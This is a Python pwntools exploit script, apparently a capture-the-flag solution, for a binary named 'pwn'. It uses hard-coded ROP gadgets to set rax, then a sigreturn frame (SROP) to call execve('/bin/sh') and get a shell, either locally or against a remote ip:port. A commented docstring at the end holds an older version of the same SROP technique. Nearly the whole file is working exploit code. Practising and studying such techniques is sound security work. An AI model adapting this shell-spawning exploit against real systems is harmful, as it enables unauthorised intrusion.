#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
# set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

syscall = 0x0000000000401019
ret = 0x000000000040102F
set0_rax = 0x40103D
shl_rax = 0x401030
xor_rax1 = 0x401034
start_addr = 0x401000

# rax=readcnt

ru(b"Hello Pwn")
payload = p64(start_addr) * 3
s(payload)

ru(b"Hello Pwn")
payload = flat(
    [
        set0_rax,
        xor_rax1,
        shl_rax,
        xor_rax1,
        shl_rax,
        xor_rax1,
        shl_rax,
        xor_rax1,
        syscall,
    ]
)
sigframe = SigreturnFrame()
sigframe.rax = 0x3B
sigframe.rdi = 0x40200A
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rsp = 0x402030
sigframe.rip = syscall
payload += bytes(sigframe)
s(payload)

ia()

"""
## make the rsp point to stack_addr
## the frame is read(0,stack_addr,0x400)

## set rax=15 and call sigreturn
sigreturn = p64(syscall_ret) + 'b' * 7
sh.send(sigreturn)

## call execv("/bin/sh",0,0)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe)
print len(frame_payload)
payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'
sh.send(payload)
sh.send(sigreturn)
"""
